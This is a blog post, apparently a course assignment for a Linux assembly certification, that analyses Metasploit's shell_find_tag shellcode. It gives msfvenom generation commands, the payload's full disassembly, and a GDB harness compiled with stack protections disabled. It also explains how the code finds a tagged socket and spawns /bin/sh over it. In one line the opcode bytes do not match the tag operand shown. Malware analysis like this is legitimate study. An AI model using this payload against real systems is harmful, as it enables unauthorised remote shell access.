<!DOCTYPE HTML>
<!--
	Solution for SLAE question #5 part 3

-->
<html>
	<head>
		<link rel="icon" href="../images/favicon.ico">
		<title>The Post</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="../assets/css/main.css" />
		<link rel="stylesheet" href="../assets/css/atom-one-dark-reasonable.min.css">
		<script src="../assets/js/highlight.pack.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
		<noscript><link rel="stylesheet" href="../assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<a class="logo">The Defense</a>
					</header>

				<!-- Nav -->
					<nav id="nav">
						<ul class="links">
							<li><a href="../index.html">Home</a></li>
							<li class="active"><a href="../posts.html">Posts</a></li>
							<li><a href="../research.html">Research</a></li>
							<li><a href="../stories.html">Stories</a></li>
							<li><a href="../references.html">Links</a></li>
						</ul>
						<ul class="icons">
							<!--<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>-->
							<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
							<li><a href="https://twitter.com/___J0hn___" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
							<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
						</ul>
					</nav>

				<!-- Main -->
					<div id="main">
						<div class="wrapper">

						<!-- Post -->

									<!--
									Post body goes here.
									-->
                  <!--
                  Solving slae question 5 part 3
                  -->
                  <section class="post">
                    <body>
                      <article id="first-post">
												<a href="index.html"><img src="../images/tomlin.png" class="avatar" alt="avatar"> </img></a>
                        <h2>&emsp; Analyzing Shell_Find_Tag Payload</h2>
												<h5>&emsp; &emsp; &emsp; &emsp; November 5, 2020</h5>
                        <div class="box">

													<br><h2>Contents</h2>
													<a href="#Started" style="color:blue;">Getting Started</a><br>
													<a href="#Disassembly" style="color:blue;">Dumping the Disassembly</a><br>
													<a href="#Libemu" style="color:blue;">Libemu Analysis</a><br>
													<a href="#GDB" style="color:blue;">GDB Analysis</a><br>
													<a href="#Static" style="color:blue;">Static Analysis</a><br>
													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>

											<p>
											&emsp; &emsp;Good afternoon again Tim, this is the last of three posts about analyzing <i>msfvenom</i> shellcode samples. &nbsp;This sample is <i>shell_find_tag</i>, which is the unstaged
											version and therefore larger in size. &nbsp;<i>Msfvenom</i> is a command
											line tool by <a href="https://blog.rapid7.com/2011/05/24/introducing-msfvenom/" target="_blank" style="color:blue;"><i>Rapid7</i></a> that generates payloads
											in various formats and encoding schemes. &nbsp;According to <i>Offensive Security</i>, it combined functionally of both <i>msfpayload</i> and <i>msfencode</i> as of
											June 8, 2015 by placing both tools under a single framework.
											</p>



			<br><section id="Started"><h2>Getting Started</h2></section>

											<p>
												&emsp; &emsp;Using any machine with Metasploit Framework, dump available payloads and verify <i>../shell_find_tag</i> exists. &nbsp;The specific command is
												<code>msfvenom -l payloads | grep "linux/x86"</code>:
											</p>
											<center><div class="image post"><img src="../images/slae/assignment5/shell/1-payloads-shell.png" alt="" /></div></center><br>

											<p>
												Next step is to determine what the payload requires. &nbsp;Dump the summary information with the command
												<code>msfvenom -l linux/x86/shell_find_tag --list-options</code>. &nbsp;According to the description, the <i>shell_find_tag</i>
												payload piggybacks off an established connection to spawn a command shell. &nbsp;No traditional options are associated with the shellcode; however,
												it includes an advanced TAG option at the bottom. &nbsp;The tag "f4sS" equates to <i>\x66\x34\x73\x53</i>. &nbsp;Upon closer inspection, it is revealed the tag
												is randomly generated by <i>msfvenom</i>. &nbsp;This can be simplified by setting the tag to something more simple by including <code>TAG=AAAA</code> in the command.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment5/shell/2-find_tag-summary.png" alt="" /></div></center><br>



			<br><section id="Disassembly"><h2>Dumping the Disassembly</h2></section>

									<p>
										&emsp; &emsp;Dump the disassembly with <i>ndisasm</i> using command <code>msfvenom -p linux/x86/shell_find_tag TAG=AAAA R | ndisasm -u -</code>. &nbsp;The <i>-p</i> option specifies the payload.
										 &nbsp;<i>R</i> specifies raw output, which is then piped into <i>ndisasm</i>. &nbsp;
										<a href="https://linux.die.net/man/1/ndisasm" target="_blank" style="color:blue;"><i>ndisasm</i></a> stands for "Netwide Disassembler" and is the companion disassembler for the
										 <i>nasm</i> assembler used in the previous four blog posts. &nbsp;The <i>-u</i> option specifies 32-bit mode. &nbsp;Finally the single dash is a common UNIX option
										 which allows <i>ndisasm</i> to
										<a href="https://stackoverflow.com/questions/8045479/whats-the-magic-of-a-dash-in-command-line-parameters" target="_blank" style="color:blue;">allow input from <i>stdin</i></a>.
									</p>
									<pre>
										<code class="x86asm" style=display:block;white-space:pre-wrap>
00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  89E6              mov esi,esp
00000005  6A40              push byte +0x40
00000007  B70A              mov bh,0xa
00000009  53                push ebx
0000000A  56                push esi
0000000B  53                push ebx
0000000C  89E1              mov ecx,esp
0000000E  86FB              xchg bh,bl
00000010  66FF01            inc word [ecx]
00000013  6A66              push byte +0x66
00000015  58                pop eax
00000016  CD80              int 0x80
00000018  813E634B7870      cmp dword [esi],0x41414141
0000001E  75F0              jnz 0x10
00000020  5F                pop edi
00000021  89FB              mov ebx,edi
00000023  6A02              push byte +0x2
00000025  59                pop ecx
00000026  6A3F              push byte +0x3f
00000028  58                pop eax
00000029  CD80              int 0x80
0000002B  49                dec ecx
0000002C  79F8              jns 0x26
0000002E  6A0B              push byte +0xb
00000030  58                pop eax
00000031  99                cdq
00000032  52                push edx
00000033  682F2F7368        push dword 0x68732f2f
00000038  682F62696E        push dword 0x6e69622f
0000003D  89E3              mov ebx,esp
0000003F  52                push edx
00000040  53                push ebx
00000041  89E1              mov ecx,esp
00000043  CD80              int 0x80
										</code>
									</pre>

									<p>
										The above dump is the entire assembly output including 3 <i>int 0x80</i> system calls (syscalls). &nbsp;At first glance,
										the tag is shown along with a couple of DWORDs pushed onto the stack. &nbsp;This is only a cursory review and more will be revealed. &nbsp;Static analysis
										works later but <i>Libemu</i> and <i>GDB</i> analysis will help.
									</p>



			<br><section id="Libemu"><h2>Libemu Analysis</h2></section>
								<!--
								Libemu appears to work on this payload.  This section needs further work.
								-->
								<p>
									&emsp; &emsp;<i>Libemu</i> is a tricky tool to install from <i>git</i>. &nbsp;Luckily an easier option exists for 32-bit Linux systems using simple install commands:
								</p>
								<pre>
									<code class="bash" style=display:block;white-space:pre-wrap>
jpc0016@bob:~$ sudo apt-get install libemu2
jpc0016@bob:~$ sudo apt install graphviz
									</code>
								</pre>

								<p>
									It is also recommended to install the 32-bit version of
									<a href="https://metasploit-for-linux-32-bit.soft112.com/download.html" target="_blank" style="color:blue;"><i>Metasploit Framework</i></a>
									 to directly pipe raw output into <i>Libemu</i>; however, copy/pasting can still happen should problems arise. &nbsp;The
									process will take more steps but analysis can continue. &nbsp;Once downloaded, run <code>chmod +x</code> on the <i>.run</i> file and execute
									with <i>sudo</i>. &nbsp;Navigate through the installer GUI and finally confirm functionality with <code>msfvenom --help</code>!<br>
									&emsp; &emsp;A bit of caution: 32-bit <i>Metasploit</i> contains problems with gemfiles that require remediation. &nbsp;Rapid7
									<a href="https://docs.rapid7.com/metasploit/support-for-32-bit-operation-systems/" target="_blank" style="color:blue;">discontinued support</a> for 32-bit
									 installers on July 5, 2017 which means finding relevant help is more difficult. &nbsp;The gem issue is likely not a problem if analysis happens
									 on a 32-bit Kali machine.
									<br>
								</p>
								<center><div class="image post"><img src="../images/slae/assignment5/shell/3-msf-install.png" alt="" /></div></center><br>

								<p>
									<i>sctest</i> produced new messages and produced many more syscalls than the previous 2 payloads. &nbsp;This is a good sign as a Control Flow Graph (CFG) file
									can be generated from the output. &nbsp;The command is: <br>
									 <code>msfvenom -p linux/x86/shell_find_tag R | ./sctest -vvv -Ss 100000 -G find-tag.dot</code>
							 </p>
								<center><div class="image post"><img src="../images/slae/assignment5/shell/4-sctest-messages.png" alt="" /></div></center><br>

								 <p>
									A <i>dot</i> file is generated in addition to the <i>sctest</i> output. &nbsp;Graph output indicators are included in the first line of the output followed by
									verbosity. &nbsp;The purpose of <i>dot</i> is to organize the shellcode's behaviour by instruction groups and present that illustration to analysts; similar to a
									decompiler. &nbsp;Dump the <i>dot</i> file contents for inspection or copy/paste.
								</p>
								<center><div class="image post"><img src="../images/slae/assignment5/shell/5-dump-dot.png" alt="" /></div></center><br>

								<p>
									Generate the <i>png</i> file using <i>dot</i>. &nbsp;The <i>-T</i> option sets the output format, which is <i>png</i> in this case. &nbsp;The <i>-o</i> option sets
									output file name. &nbsp;A png file depicting the payload's control flow was successfully created!
							 </p>
								<center><div class="image post"><img src="../images/slae/assignment5/shell/6-create-png.png" alt="" /></div></center><br>

								<p>
									Finally check the output image to find a populated CFG. &nbsp;On inspection, the shellcode cycles around the <i>recv()</i> syscall and increments the DWORD
									parameter at <i>ecx</i> if it does not equal 0x41414141. &nbsp;Basically it is checking for the tag, "AAAA", over a socket connection. &nbsp;Other <i>Libemu</i> tools are unsupported
									 in the current version so dynamic and static analysis are the natural next steps.
							 </p>
								<center><div class="image post"><img src="../images/slae/assignment5/shell/7-png-created.png" alt="" /></div></center><br>



			<br><section id="GDB"><h2>GDB Analysis</h2></section>

									<p>
										&emsp; &emsp;In order to analyze the shellcode in <i>GDB</i>, it will need to be extracted and placed into a C-code harness.
										 &nbsp;Use the below command to create a payload in C-code format. &nbsp;The specified tag can be seen clear as day! &nbsp;To list additional formats,
										 simply run <code>msfvenom --list formats</code>.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/8-create-shellcode.png" alt="" /></div></center><br>

									<p>
										Copy and paste shellcode into the C-code harness.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/9-paste-harness.png" alt="" /></div></center><br>

									<p>
										Save the file and compile it with <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code>. &nbsp;Start
										<i>GDB</i> in quiet mode and disassemble the <i>main()</i> function. &nbsp;Stop at instruction <code>call eax</code>. &nbsp;This
										is where the shellcode is passed control.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/10-gdb-main.png" alt="" /></div></center><br>

									<p>
										Step one more instruction then disassemble the payload. &nbsp;This should look identical to the <i>nasm</i> disassembly.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/11-assembly-dump.png" alt="" /></div></center><br>

									<p>
										As mentioned earlier, the above assembly shows 3 syscalls and a couple ascii DWORDs pushed onto the stack. &nbsp;By noting the values of <i>eax</i>,
										each syscall can be mapped in order using the <a href="http://shell-storm.org/shellcode/files/syscalls.html" target="_blank" style="color:blue;">syscall table</a>:
										<li><a href="https://man7.org/linux/man-pages/man2/socketcall.2.html" target="_blank" style="color:blue;"><i>socketcall()</i></a></li>
										<li><a href="https://man7.org/linux/man-pages/man2/dup2.2.html" target="_blank" style="color:blue;"><i>dup2()</i></a></li>
										<li><a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" style="color:blue;"><i>execve()</i></a></li><br>

										Starting with <i>socketcall()</i>, 0x66 (103) is loaded into <i>eax</i> while the program sets <i>ebx</i> and <i>ecx</i>.
										 &nbsp;A hook-stop should be used to visualize program behaviour when setting <i>socketcall()</i> parameters. &nbsp;The corresponding
										 hook-stop is defined below:
									</p>
									<pre>
										<code style=display:block;white-space:pre-wrap>
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>print/x $eax
>print/x $ebx
>print/x $ecx
>print/x $edx
>print/x $esi
>print/x $edi
>disassemble $eip,+28
>x/24xb $esp
>end
(gdb)
										</code>
									</pre>

									<p>
										Before stepping through instructions, it is worth investigating the function's man page. &nbsp;<i>socketcall()</i> is a syscall that defers to other socket-based functions and is
										exclusive to Linux systems. &nbsp;Register <i>ebx</i> is its first parameter and contains the number
										 referring to the <b>actual</b> syscall. &nbsp;These syscall values are located in <code>/usr/include/linux/net.h</code>:
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/12-net-header.png" alt="" /></div></center><br>

									<p>
										Further review of <i>recv()</i> is needed to understand values located at <i>ecx</i>. &nbsp;The syscall takes 4 parameters shown below; each being 4 bytes long (32 bits). &nbsp;
										<i>read()</i> was listed as well to illustrate similarity.
									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
// Function definition
ssize_t recv(int sockfd, void *buf, size_t len, int flags);

// Read() definition for comparison
ssize_t read(int fd, void *buf, size_t count);
										</code>
									</pre>

									<p>
										<i>sockfd</i> is the socket file descriptor used to receive a socket connection. &nbsp;<i>buf</i> is the destination of memory that will be written to. &nbsp;<i>len</i> is the number
										of bytes to read. &nbsp;Finally <i>flags</i> describes how the data is handled. &nbsp;Flag definitions can be found in <code>/usr/include/i386-linux-gnu/bits/socket.h</code>.

									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/13-msg_dontwait.png" alt="" /></div></center><br>

									<p>
										Step through instructions up to <i>int 0x80</i> and observe how parameters are loaded onto the stack. &nbsp;A call to <i>recv()</i> will be executed as described in <i>Libemu</i> and the
										<i>net.h</i> file from earlier. &nbsp;Register <i>ecx</i> holds a pointer to the <i>recv()</i> parameters, which are described above. &nbsp;The <i>edx</i> value does not matter at this
										time since <i>socketcall()</i> requires only 2 parameters.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/14-before-recv.png" alt="" /></div></center><br>

									<p>
										Step again to observe results after the syscall. &nbsp;Register <i>eax</i> is 0xfffffff7 (-1) meaning the call returned a bad file descriptor. &nbsp;Nothing was changed
										on the stack; however, the word at <i>ecx</i> is incremented to 0xa02 in the following steps. &nbsp;This repeats for every bad file descriptor encountered. &nbsp;Based on stack values, the
										parameters to <i>recv()</i> are as follows:<br>
										&emsp; &emsp;<b>int sockfd:</b> &nbsp;0x00000a01 <br>
										&emsp; &emsp;<b>void *buf:</b> &nbsp;0xffffd718 <br>
										&emsp; &emsp;<b>ssize_t size:</b> &nbsp;0x00000a00 <br>
										&emsp; &emsp;<b>int flags:</b> &nbsp;0x00000040 <br>
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/15-after-recv.png" alt="" /></div></center><br>

									<p>
										Cyclic activity is confirmed when running the binary with <i>strace</i>. &nbsp;The file descriptor is incremented by 1 each time <i>recv()</i> is called. &nbsp;Due to its initial value,
										<i>recv()</i> starts reading file descriptors starting at 2561 (0x0a01). &nbsp;This means <i>recv()</i> probably listens for high-numbered file descriptors to avoid detection. &nbsp;Detection is likely
										 to happen if a low numbered file descriptor is created in a routine process but collides with something malicious. &nbsp;Based on this analysis, it appears <i>shell_find_tag</i> is part of an
										 exploit chain in which the first exploit creates a socket file descriptor greater than or equal to 2561.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/16-recv-activity.png" alt="" /></div></center><br>



			<br><section id="Static"><h2>Static Analysis</h2></section>

									<p>
										&emsp; &emsp;Static analysis is sufficient for the remainder of the payload as there are only 2 familiar syscalls left. &nbsp;The next syscall is <i>dup2()</i> shown
										by loading 0x3f (63) into <i>eax</i>. &nbsp;<i>dup2()</i> duplicates an "old" file descriptor to a "new" one. &nbsp;Its function definition is below:
									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
// Function definition
int dup2(int oldfd, int newfd);
										</code>
									</pre>

									<p>
										Once the tag is found, the file descriptor is popped off the stack into <i>edi</i> and moved into <i>ebx</i>. &nbsp;This is the "old" file descriptor. &nbsp;Then 0x2 is loaded
										into <i>ecx</i>, which is the "new" file descriptor. &nbsp;The syscall number is loaded into <i>eax</i> and finally executed with <i>int 0x80</i>. &nbsp;On success, the return
										value is the new file descriptor (basically the <i>ecx</i> value). &nbsp;<i>ecx</i> is decremented then the sign flag is checked. &nbsp;If the sign flag equals zero, the
										program jumps back to the <i>pop eax</i> instruction. &nbsp;Basically this process repeats to duplicate the file descriptor from <i>recv()</i> into stderr (fd 2), stdout (fd 1),
										and stdin (fd 0); identical behavior to <a href="https://thestunneddefense.com/pages/shell-bind-tcp.html" target="_blank" style="color:blue;">shell_bind_tcp</a>.
									</p>
								<pre>
									<code class="x86asm" style=display:block;white-space:pre-wrap>
; -- snip --
; dup2() section

00000020  5F                pop edi			; edi = sockfd from recv()
00000021  89FB              mov ebx,edi			; ebx = sockfd from recv()
00000023  6A02              push byte +0x2
00000025  59                pop ecx			; ecx = 0x00000002

; jmp destination
00000026  6A3F              push byte +0x3f
00000028  58                pop eax			; eax = 0x0000003f = dup2() syscall
00000029  CD80              int 0x80			; syscall
0000002B  49                dec ecx			; ecx = ecx - 1
0000002C  79F8              jns 0x26			; jump to 0x26 if ecx >= 0

; -- snip --
									</code>
								</pre>

									<p>
										<i>dup2()</i> is very straightforward and mimics previously seen activity in shell_bind_tcp. &nbsp;The next syscall section is <i>execve()</i> as indicated by
										moving 0xb into <i>eax</i>. &nbsp;Luckily <i>execve()</i> is nearly identical to instructions from the lectures! &nbsp;Its function definition is below:
									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
// Function definition
int execve(const char *pathname, char *const argv[], char *const envp[]);
										</code>
									</pre>

									<p>
										An overview of <i>execve()</i> parameters are below:<br>
										&emsp; &emsp;<b>const char *pathname:</b> &nbsp;Pointer to the name of the program to be executed. <br>
										&emsp; &emsp;<b>char *const argv[]:</b> &nbsp;Pointer to the program's arguments; specifically the arguments are passed an an array of string &emsp; &emsp;&emsp;pointers.<br>
										&emsp; &emsp;<b>char *const envp[]:</b> &nbsp;Pointer to the new program's environment variables passed as an array of string pointers. &nbsp;It looks &emsp; &emsp;similar to
										(<a href="https://stackoverflow.com/questions/7656549/understanding-requirements-for-execve-and-setting-environment-vars" target="_blank" style="color:blue;">source</a>):
										<pre><code class="c-like" style=display:block;white-space:pre-wrap>
// *envp[] example

char *envp[] =
    {
        "HOME=/",
        "PATH=/bin:/usr/bin",
        "TZ=UTC0",
        "USER=beelzebub",
        "LOGNAME=tarzan",
        0
    };</code></pre><br>

										The first 4 instructions are a clever way to place 0 into <i>edx</i>. &nbsp;If <i>eax</i> is small enough, it can be sign-extended with instruction <i>cdq</i>.
										 &nbsp;The high-bit (0x0) is copied to every bit in edx making it 0x00000000! &nbsp;Next is creating the pathname string, which involves pushing NULL onto the stack followed
										 by "/bin//sh" in little endian. &nbsp;The stack pointer is moved to <i>ebx</i> to create the first parameter. &nbsp;Simply push <i>edx</i> and <i>ebx</i> onto the
										 stack and move the stack pointer into <i>ecx</i> to create the final parameter. &nbsp;This is easy since
										 <i>/bin/sh</i> requires no parameters. &nbsp;Invoke syscall to complete the payload!
									</p>
								<pre>
									<code class="x86asm" style=display:block;white-space:pre-wrap>
; -- snip --
; execve() section

0000002E  6A0B              push byte +0xb
00000030  58                pop eax                 ;   eax = 0x0000000b = execve() syscall
00000031  99                cdq                     ;   cdq = sign-extension of eax. eax -> edx:eax
00000032  52                push edx                ;   push NULL onto stack
00000033  682F2F7368        push dword 0x68732f2f   ;   "hs//"
00000038  682F62696E        push dword 0x6e69622f   ;   "nib/"
0000003D  89E3              mov ebx,esp             ;   ebx points to "/bin//sh"
0000003F  52                push edx                ;   push NULL onto stack
00000040  53                push ebx                ;   push "/bin/sh" onto stack
00000041  89E1              mov ecx,esp             ;   ecx points to ["/bin/sh", NULL]
00000043  CD80              int 0x80		    ;   syscall
									</code>
								</pre>



		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>

									<p>
										&emsp; &emsp;This payload was more interesting and finally utilized <i>Libemu</i>! &nbsp;Thanks to graphical analysis, static analysis was much easier and less
										time demanding. &nbsp;Further dynamic analysis could work; however, it requires additional setup time to get past <i>recv()</i> syscalls. &nbsp;This was infeasable as following
										syscalls were simple enough for static analysis. &nbsp;The next assignment involves creating polymorphic versions of shell-storm payloads.
									</p>

									<p>
										The source code for this assignment as well as other SLAE assignments is here:
										<a href="https://github.com/jpc0016/SLAE-code" target="_blank" style="color:blue;">https://github.com/jpc0016/SLAE-code</a>
									</p>

									<p>
									This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
									<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank" style="color:blue;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br>

									Student ID: PA-15981
									</p>

                        </div>

                      </article>
                    </body>
                  </section>

									<!--
									End post body
									-->

									<!--
									NEW POSTS GO ABOVE THIS LINE
									-->

									<!-- Remove Pagination
							<div class="pagination"><a href="#"> 1 </a></div>
							<div class="pagination"><a href="#"> 2 </a></div>
							<div class="pagination"><a href="#"> 3 </a></div>
							<div class="pagination"><a href="#"> 4 </a></div>
							<div class="pagination"><a href="#"> 5 </a></div>-->
							</div>
					</div>

				<!-- Footer -->
					<footer id="footer">

						<section class="split contact">

							<section>
								<h3>Social</h3>
								<ul class="icons alt">
									<!--<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>-->
									<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
									<li><a href="https://twitter.com/___J0hn___" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
									<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
								</ul>
							</section>
						</section>
					</footer>

				<!-- Copyright -->
					<div id="copyright">
						<ul><li>&copy; Untitled</li><li>Design: <a href="https://html5up.net" target="_blank">HTML5 UP</a></li></ul>
					</div>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrollex.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</html>
